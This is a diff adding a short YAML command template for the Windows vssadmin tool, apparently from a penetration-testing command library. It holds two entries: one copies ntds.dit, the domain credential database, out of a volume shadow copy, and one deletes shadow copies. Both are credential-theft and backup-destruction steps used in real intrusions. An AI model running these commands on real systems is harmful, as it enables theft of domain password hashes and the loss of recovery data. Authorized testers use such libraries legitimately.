@@ -1,0 +1,23 @@
+---
+name: vssadmin
+description: Displays the current volume shadow copy backups and all installed shadow copy writers and providers
+os: Windows
+ptf_module: null
+---
+commands:
+  - "Copy NTDS.dit via Volume Shadow Copy":
+    - type: ["cmd","standalone"]
+    - text:
+      - "vssadmin create shadow /for=C:"
+      - "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\ntds\\ntds.dit {FULLPATH}"
+    - input: ["extracted ntds.dit file path"]
+    - output: ["STDOUT",{"FILE":{"input":1}}]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+
+  - "Delete Shadow Volume":
+    - type: ["cmd","standalone"]
+    - text: "vssadmin delete shadows /shadow={STR}"
+    - input: ["shadow copy ID"]
+    - output: ["STDOUT"]
+    - note: "https://github.com/mikeiacovacci/axiom-data-demo-z"
+...
